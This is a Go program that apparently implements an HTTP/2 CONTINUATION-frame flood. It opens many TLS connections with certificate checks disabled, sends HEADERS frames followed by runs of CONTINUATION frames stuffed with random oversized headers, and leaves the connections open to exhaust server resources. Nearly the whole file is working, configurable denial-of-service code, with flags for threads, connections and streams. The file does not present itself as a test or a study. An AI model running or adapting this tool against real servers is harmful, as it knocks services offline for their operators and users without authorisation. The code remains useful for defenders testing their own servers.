package main

import (
	"bytes"
	"flag"
	"log"
	"math/rand"
	"strings"
	"sync/atomic"
	"crypto/tls"
	"time"
	"os"
	"net"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	transportDefaultStreamFlow = 4 << 20
	maxFrameSize               = 1<<24 - 1
	maxHeaderListSize          = 10 << 20
	headerTableSize            = 4096
)

var (
	conn_delay      int64
	streams_num     uint64
	connections     int
	threads    	int
	address         string
	host       	string
	headerFieldSize int = 1000
	headersCount    int
	debug		int
)

var letters = []rune("abcdefghijklmnopqrstuvwxyz")
var headers = []string{}

var finished int64

func init() {
	flag.StringVar(&address, "address", ":443", "server address")
	flag.StringVar(&host, "host", "localhost", "host/authority header")
	flag.IntVar(&threads, "threads", 1, "number of threads to start")
	flag.IntVar(&connections, "connections", 1, "number of connections to start")
	flag.Uint64Var(&streams_num, "streams", 10, "number of streams in each connection")
	flag.Int64Var(&conn_delay, "conn_delay", 0, "connection delay in ms")
	flag.IntVar(&headersCount, "headers_cnt", 5, "count of headers per request")
	flag.IntVar(&debug, "debug", 0, "debug level")
	flag.Parse()

	if headerFieldSize > 4000 {
		log.Fatal("-header-size too big")
	}

	log.Printf("Generating random headers (header-size=%d header-count=%d)...\n", headerFieldSize * 2, headersCount)
	// Pregenerate random headers
	for i := 0; i < 100; i++ {
		var sb strings.Builder
		for i := 0; i < headerFieldSize; i++ {
			sb.WriteRune(letters[rand.Intn(len(letters))])
		}
		headers = append(headers, sb.String())
	}
}

func main() {
	log.Printf("Starting %d connections in %d threads", connections, threads)
	var conn_per_thread int = connections / threads
	var rem int = connections % threads

	for i := 0; i < threads; i++ {
		if conn_delay > 0 {
			time.Sleep(time.Duration(conn_delay) * time.Millisecond)
		}
		inc := 0
		if rem > 0 {
			inc = 1
			rem--
		}
		go func(i int, inc int) {
			for j := 0; j < conn_per_thread + inc; j++ {
				connection(i)
				nfinished := atomic.AddInt64(&finished, 1)
				if (nfinished == int64(connections)) {
					log.Printf("All connections are finished, stopping program\n")
					os.Exit(0)
				}
				if conn_delay > 0 {
					time.Sleep(time.Duration(conn_delay) * time.Millisecond)
				}
			}
		}(i, inc)
	}

	done := make(chan struct{})
	<-done
}

func connection(cid int) {
	conf := &tls.Config{
         InsecureSkipVerify: true,
	 NextProtos: []string{"h2"},
    	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout:  2 * time.Second},
					"tcp", address, conf)
	if err != nil {
		if (debug > 0) {
			log.Printf("Connection error. Filtered?: %s\n", err)
		}
		return
	}

	_, err = conn.Write([]byte(http2.ClientPreface))
	if err != nil {
		panic(err)
	}

	framer := http2.NewFramer(conn, conn)

	initialSettings := []http2.Setting{
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: transportDefaultStreamFlow},
		{ID: http2.SettingMaxFrameSize, Val: maxFrameSize},
		{ID: http2.SettingMaxHeaderListSize, Val: maxHeaderListSize},
		{ID: http2.SettingHeaderTableSize, Val: headerTableSize},
	}
	err = framer.WriteSettings(initialSettings...)
	if err != nil {
		panic(err)
	}

	go func() {
		// Read 3 init frames:
		// SETTINGS, SETTINGS_ACK and WINDOW_UPDATE
		// and others
		for {
			_, err := readPrintFrame(cid, framer)
			if err != nil {
				//log.Printf("[%d] Read: %s\n", cid, err)
				return
			}
		}
	}()

	var stream_id uint32

	for stream_id = 1; stream_id < uint32(streams_num * 2); stream_id += 2 {
		blockBuffer := bytes.Buffer{}
		henc := hpack.NewEncoder(&blockBuffer)
		henc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
		henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
		henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		henc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})

		err = framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      stream_id,
			EndStream:     false,
			EndHeaders:    false,
			BlockFragment: blockBuffer.Bytes(),
		})

		if err != nil {
			log.Printf("[%d] Error writing HEADERS %s\n", cid, err)
			return
		}

		max_frames := (headersCount * (headerFieldSize * 2)) / 16384
		if max_frames <= 0 {
			max_frames = 1
		}

		for sentFrames := 0; sentFrames < max_frames; sentFrames++ {
			var endhdrs bool = false
			if (sentFrames == max_frames - 1) {
				endhdrs = true
			}
			block := generateIndexedHeadersBlock(headersCount / max_frames)
			err = framer.WriteContinuation(
				stream_id,
				endhdrs,
				block,
			)

			if err != nil {
				log.Printf("[%d] Error writing CONTINUATION %s\n", cid, err)
				return
			}
		}
	}

	// Connection will be left intact after this function ends
}

func generateIndexedHeadersBlock(headersCnt int) []byte {
	blockBuffer := bytes.Buffer{}
	henc := hpack.NewEncoder(&blockBuffer)
	for i := 0; i < headersCnt; i++ {
		header := headers[rand.Intn(len(headers))]
		henc.WriteField(hpack.HeaderField{
			Name:  header,
			Value: header,
		})
	}
	return blockBuffer.Bytes()
}

func readPrintFrame(cid int, framer *http2.Framer) (http2.Frame, error) {
	frame, err := framer.ReadFrame()
	if err != nil {
		log.Printf("[%d] Error reading %+v. Reason: %s\n", cid, frame, err)
		return frame, err
	}

	if debug > 1 {
		log.Printf("[%d] Read frame %+v\n", cid, frame)
	}

	if frame.Header().Type == http2.FrameGoAway {
		log.Println(frame.(*http2.GoAwayFrame).ErrCode)
	}

	return frame, nil
}
